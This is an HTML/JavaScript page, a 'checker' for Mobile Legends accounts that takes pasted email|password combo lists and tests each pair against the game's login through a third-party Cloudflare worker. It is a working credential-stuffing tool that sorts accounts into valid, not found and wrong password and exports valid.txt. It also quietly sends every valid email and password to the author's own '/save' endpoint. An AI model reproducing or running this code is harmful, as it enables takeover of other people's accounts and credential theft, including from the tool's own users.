<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>MLBB Checker By Arif Hidayatulloh</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cstaticdun.126.net/load.min.js"></script>
<style>
  body {
    font-family: 'Poppins', sans-serif;
    max-width: 1100px;
    margin: 40px auto;
    padding: 20px;
    background: linear-gradient(135deg, #1f1c2c, #928dab);
    color: #f5f5f5;
  }

  h2 {
    text-align: center;
    margin-bottom: 40px;
    font-weight: 700;
    font-size: 40px;
    color: #f5f5f5;
    text-shadow: 3px 3px 8px rgba(0, 0, 0, 0.5), 0 0 25px rgba(255, 255, 255, 0.3), 0 0 5px rgba(0, 0, 0, 0.5);
    letter-spacing: 2px;
    background: -webkit-linear-gradient(45deg, #ff007f, #6a11cb, #00c6ff);
    background-clip: text;
    -webkit-background-clip: text;
    animation: glowingText 2s ease-in-out infinite alternate;
  }

  @keyframes glowingText {
    0% { text-shadow: 0 0 5px rgba(255, 255, 255, 0.6), 0 0 10px rgba(255, 255, 255, 0.4); }
    50% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(0, 255, 255, 0.7), 0 0 30px rgba(0, 255, 255, 0.6); }
    100% { text-shadow: 0 0 5px rgba(255, 255, 255, 0.6), 0 0 10px rgba(255, 255, 255, 0.4); }
  }

  p {
    text-align: center;
    font-size: 14px;
    color: #dcdcdc;
    margin-bottom: 30px;
  }

  textarea {
    width: 100%;
    height: 180px;
    font-family: monospace;
    border-radius: 10px;
    border: none;
    padding: 15px;
    resize: none;
    background: rgba(255,255,255,0.05);
    color: #fff;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
  }

  button {
    padding: 12px 20px;
    font-weight: 600;
    border-radius: 8px;
    border: none;
    cursor: pointer;
    transition: all 0.3s ease;
    margin-right: 10px;
  }

  #startBtn { background: #6a11cb; color: #fff; }
  #startBtn:hover { background: #2575fc; }

  #stopBtn { background: #fc5c7d; color: #fff; }
  #stopBtn:hover { background: #ff758c; }

  #downloadBtn { background: #00c6ff; color: #fff; }
  #downloadBtn:hover { background: #0072ff; }

  #captcha-container {
    margin: 20px 0;
    display: flex;
    gap: 30px;
    justify-content: center;
  }

  #captcha-root-0, #captcha-root-1 {
    background: rgba(255,255,255,0.05);
    padding: 20px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
  }

  #log {
    background: rgba(0,0,0,0.6);
    color: #eee;
    height: 300px;
    overflow-y: auto;
    padding: 15px;
    font-family: monospace;
    white-space: pre-wrap;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    margin-top: 10px;
  }

  .ok { color: #7CFC00; }
  .bad { color: #FF6B6B; }
  .info { color: #FFD866; }

  #status {
    margin-top: 15px;
    font-weight: 600;
    text-align: center;
    font-size: 16px;
    color: #ffffff;
  }

  #log::-webkit-scrollbar { width: 8px; }
  #log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
  #log::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
</style>
</head>
<body>

<h2>MLBB Checker By Arif Hidayatulloh</h2>
<p>Paste daftar akun (email|password per baris). Akan muncul 2 CAPTCHA sekaligus. Hasil langsung muncul di log.</p>

<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
<br>
<div style="text-align:center; margin-top: 15px;">
  <button id="startBtn">Start Checking</button>
  <button id="stopBtn" disabled>Stop</button>
  <button id="downloadBtn">Download valid.txt</button>
</div>

<div id="status"></div>

<div id="captcha-container">
  <div id="captcha-root-0"></div>
  <div id="captcha-root-1"></div>
</div>

<h3 style="text-align:center; margin-top:30px;">Log:</h3>
<div id="log"></div>

<script>
const CAPTCHA_IDS = ["fef5c67c39074e9d845f4bf579cc07af", "fef5c67c39074e9d845f4bf579cc07af"];
const WORKER_URL = "https://hidayat.bonar7527.workers.dev";

let combos = [];
let stopRequested = false;
let neCaptchaInstances = [null, null];
let validAccounts = [];

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");
const downloadBtn = document.getElementById("downloadBtn");

// Audio Sharingan
const sharinganAudio = new Audio("https://www.myinstants.com/media/sounds/sharingan.mp3");
sharinganAudio.preload = "auto";

function appendLog(text, cls) {
  const time = new Date().toLocaleTimeString();
  const div = document.createElement("div");
  div.textContent = `[${time}] ${text}`;
  if(cls) div.className = cls;
  logEl.appendChild(div);
  logEl.scrollTop = logEl.scrollHeight;
}

function parseCombos(text) {
  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
    if(line.includes("|")) {
      const [e,p] = line.split("|",2);
      return { email: e.trim(), password: p.trim() };
    } else if(line.includes(":")) {
      const [e,p] = line.split(":",2);
      return { email: e.trim(), password: p.trim() };
    } else {
      appendLog(`Format salah dan dilewati: ${line}`, "info");
      return null;
    }
  }).filter(Boolean);
}

function showCaptcha(index) {
  return new Promise((resolve, reject) => {
    const root = document.getElementById("captcha-root-" + index);
    root.innerHTML = "";
    if(!window.initNECaptcha) {
      appendLog("initNECaptcha tidak tersedia", "info");
      reject("initNECaptcha missing");
      return;
    }

    if(neCaptchaInstances[index] && typeof neCaptchaInstances[index].destroy === "function") {
      neCaptchaInstances[index].destroy();
      neCaptchaInstances[index] = null;
    }

    try {
      initNECaptcha({
        captchaId: CAPTCHA_IDS[index],
        element: "#captcha-root-" + index,
        mode: "embed",
        width: "320px",
        onReady() {},
        onVerify(err, data) {
          if(err || !data || !data.validate) {
            appendLog(`Captcha ${index+1} gagal`, "info");
            reject(err || "no token");
            return;
          }
          const token = data.validate;
          if(neCaptchaInstances[index] && typeof neCaptchaInstances[index].destroy === "function") {
            neCaptchaInstances[index].destroy();
            neCaptchaInstances[index] = null;
          }
          resolve(token);
        },
        onLoad(instance) {
          neCaptchaInstances[index] = instance;
        }
      });
    } catch(e) {
      appendLog(`Captcha ${index+1} gagal inisialisasi: ${e}`, "info");
      reject(e);
    }
  });
}

async function sendToKV(account) {
  try {
    await fetch(WORKER_URL + "/save", {
      method: "POST",
      body: JSON.stringify(account),
      headers: { "Content-Type": "application/json" }
    });
  } catch(e) {
    console.error("Gagal kirim ke KV:", e);
  }
}

async function checkOneAccount(account, index) {
  appendLog(`Minta captcha untuk ${account.email}`, "info");
  statusEl.textContent = `Checking ${account.email}`;
  let token;
  try {
    token = await showCaptcha(index);
  } catch(e) {
    appendLog(`Captcha gagal untuk ${account.email}: ${e}`, "bad");
    return;
  }
  appendLog(`Token captcha diterima untuk ${account.email}`, "info");

  try {
    const form = new URLSearchParams();
    form.append("email", account.email);
    form.append("password", account.password);
    form.append("e_captcha", token);

    const resp = await fetch(WORKER_URL + "/check", {
      method: "POST",
      body: form,
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });

    const data = await resp.json();

    if(data.code === 0 && data.data) {
      appendLog(`VALID => ${account.email}`, "ok");
      validAccounts.push(`${account.email}:${account.password}`);
      sendToKV({ email: account.email, password: account.password });

      // Putar suara Sharingan
      sharinganAudio.currentTime = 0;
      sharinganAudio.play().catch(err => console.log("Audio error:", err));

    } else if(data.code === 1004) {
      appendLog(`NOT FOUND => ${account.email}`, "bad");
    } else if(data.code === 1005) {
      appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
    } else {
      appendLog(`Gagal => ${account.email} | ${JSON.stringify(data)}`, "bad");
    }

  } catch(e) {
    appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
  }
}

async function startChecking() {
  combos = parseCombos(document.getElementById("combo").value);
  if(combos.length === 0) {
    appendLog("Tidak ada combo valid", "info");
    return;
  }
  stopRequested = false;
  startBtn.disabled = true;
  stopBtn.disabled = false;

  for(let i=0; i<combos.length; i++) {
    if(stopRequested) break;
    await checkOneAccount(combos[i], i % 2);
  }

  appendLog("Selesai checking.", "info");
  startBtn.disabled = false;
  stopBtn.disabled = true;
}

// Unlock audio saat klik start
startBtn.addEventListener("click", () => {
  sharinganAudio.muted = true;
  sharinganAudio.play().then(() => {
    sharinganAudio.pause();
    sharinganAudio.muted = false;
    startChecking();
  }).catch(err => {
    console.log("Audio unlock gagal:", err);
    startChecking();
  });
});

stopBtn.addEventListener("click", () => { stopRequested = true; appendLog("Stop diminta", "info"); });
downloadBtn.addEventListener("click", () => {
  if(validAccounts.length === 0) { appendLog("Tidak ada akun valid untuk di-download", "info"); return; }
  const blob = new Blob([validAccounts.join("\n")], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "valid.txt";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
});
</script>

</body>
</html>
